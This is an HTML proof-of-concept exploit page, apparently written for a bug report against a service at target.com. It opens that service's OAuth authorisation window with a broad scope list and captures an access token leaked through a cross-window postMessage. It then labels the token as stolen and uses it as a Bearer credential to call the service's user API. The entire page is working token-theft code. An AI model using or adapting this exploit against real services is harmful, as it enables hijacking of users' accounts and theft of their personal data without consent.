<!DOCTYPE html>
<html>
    <head>
    </head>
<body>

<script>
var myWindow = window.open("https://domain.target.com/auth.html?client_id=ad9ed49f55ce44bfbfabdb07522c8fd3&scope=user-read-email+user-read-private+user-top-read+playlist-modify+playlist-modify-private+playlist-modify-private+playlist-modify-public+playlist-read-private+playlist-read-private+ugc-image-upload+user-read-playback-state+user-modify-playback-state+user-read-currently-playing+streaming+app-remote-control+playlist-read-collaborative+user-library-modify+user-library-read+user-read-playback-position+user-read-recently-played+user-follow-read+user-follow-modify&page=123");
</script>



<script>


function ApiME(url, StolenBearerTokeen) {
  var xhr = new XMLHttpRequest();

  xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            console.log(this.responseText);
            alert(this.responseText);
       }
    };


  xhr.open('GET', url, true);
  xhr.setRequestHeader('Authorization', 'Bearer '+StolenBearerTokeen);
  xhr.send('');
}

window.onmessage = function (e) {

    if(e.data[0]){

        var stolen_data = e.data.toString();
        if(stolen_data.includes('accessToken')){

            var StolenDataobj = JSON.parse(stolen_data)

            alert("Stolen token: "+StolenDataobj["accessToken"].toString())
            console.log(StolenDataobj["accessToken"]);

            var StolenBearerTokeen = StolenDataobj["accessToken"].toString();

            ApiME("https://api.target.com/v1/me",StolenBearerTokeen);



        }

    }
};
</script>
</body>
</html>
